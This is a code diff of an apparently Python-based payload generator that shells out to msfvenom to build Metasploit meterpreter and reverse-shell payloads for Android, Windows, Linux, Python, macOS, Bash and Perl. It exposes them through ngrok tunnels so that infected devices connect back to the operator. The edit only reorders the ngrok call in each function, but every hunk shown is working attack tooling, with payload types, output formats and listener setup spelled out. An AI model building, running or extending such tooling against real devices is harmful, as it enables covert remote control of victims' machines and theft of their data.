@@ -45,8 +45,8 @@ def Android ():
 		payloads = "android/meterpreter/"+type[android_pld-1]
 		global url,lhost,lport
 		port = '25561'
-		ngrok(port)
 		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".apk").replace (" ","")
+		ngrok(port)
 		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload"+output
 		print (cyan+"Creating Payload...\n")
 		os.system (pld)
@@ -78,8 +78,8 @@ def Windows ():
 		payloads = "windows/meterpreter/"+type[windows_pld-1]
 		global url,lhost,lport
 		port = '25562'
-		ngrok(port)
 		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".exe").replace (" ","")
+		ngrok(port)
 		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f exe -o /sdcard/navin_playload"+output
 		print (cyan+"Creating Payload...\n")
 		os.system (pld)
@@ -111,8 +111,8 @@ def Linux ():
 		payloads = "linux/x86/shell/"+type[linux_pld-1]
 		global url,lhost,lport
 		port = '25563'
+		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".elf").replace (" ","")		
 		ngrok(port)
-		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".elf").replace (" ","")
 		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f elf -o /sdcard/navin_playload"+output
 		print (cyan+"Creating Payload...\n")
 		os.system (pld)
@@ -145,8 +145,8 @@ def Python ():
 		payloads = "python/meterpreter/"+type[python_pld-1]
 		global url,lhost,lport
 		port = '25564'
-		ngrok(port)
 		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".py").replace (" ","")
+		ngrok(port)
 		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload"+output
 		print (cyan+"Creating Payload...\n")
 		os.system (pld)
@@ -170,8 +170,8 @@ def Mac ():
 	back.banner ()
 	global url,lhost,lport
 	port = '25565'
-	ngrok(port)
 	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".macho").replace (" ","")
+	ngrok(port)
 	payloads ="osx/x86/shell_reverse_tcp"
 	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f macho -o /sdcard/navin_playload"+output
 	print (cyan+"Creating Payload...\n")
@@ -186,8 +186,8 @@ def Bash ():
 	back.banner ()
 	global url,lhost,lport
 	port = '25566'
-	ngrok(port)
 	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".sh").replace (" ","")
+	ngrok(port)
 	payloads = "cmd/unix/reverse_bash_telnet_ssl"
 	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload"+output
 	print (cyan+"Creating Payload...\n")
@@ -200,8 +200,8 @@ def Perl ():
 	back.banner ()
 	global url,lhost,lport
 	port = '25567'
-	ngrok(port)
 	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".pl").replace (" ","")
+	ngrok(port)
 	payloads = "cmd/windows/bind_perl"
 	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/navin_playload"+output
 	print (cyan+"Creating Payload...\n")
